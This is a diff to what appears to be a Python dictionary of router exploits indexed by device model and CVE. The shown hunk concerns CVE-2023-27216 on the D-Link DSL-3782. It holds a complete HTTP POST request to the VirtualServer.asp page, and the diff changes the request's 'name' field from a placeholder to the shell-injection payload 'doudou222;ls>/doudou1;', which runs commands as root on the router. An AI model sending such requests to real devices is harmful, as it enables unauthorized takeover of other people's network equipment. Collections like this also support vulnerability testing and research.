@@ -2971,8 +2971,6 @@ model_exp_dic["DSL-3782"] = {
     "CVE-2023-27216":
 ["An issue found in D-Link DSL-3782 v.1.03 allows remote authenticated users to execute arbitrary code as root via the network settings page.\n['https://lessonsec.com/cve/cve-2023-27216/']",
 """
-#name=doudou222;cmd;
-#
 POST /cgi-bin/New_GUI/VirtualServer.asp HTTP/1.1
 Host: 192.168.1.1
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
@@ -2986,7 +2984,7 @@ Origin: http://192.168.1.1
 Connection: close
 Referer: http://192.168.1.1/cgi-bin/New_GUI/VirtualServer.asp
 
-sessionKey=783368690&conn_type=ATM&buttonType=apply&editRow=0&enable_rules=Yes&scheduleValue=-&inner_display=0&enable0=&enable_vs_rules_ck=on&name=doudou222;cmd;&inIP=192.168.1.8&insPort=8888&inePort=9999&exsPort=8088&exePort=9000&protocol=ALL&pf_Schedule=Always
+sessionKey=783368690&conn_type=ATM&buttonType=apply&editRow=0&enable_rules=Yes&scheduleValue=-&inner_display=0&enable0=&enable_vs_rules_ck=on&name=doudou222;ls>/doudou1;&inIP=192.168.1.8&insPort=8888&inePort=9999&exsPort=8088&exePort=9000&protocol=ALL&pf_Schedule=Always
 """
  ],
     "CVE-2018-8898":
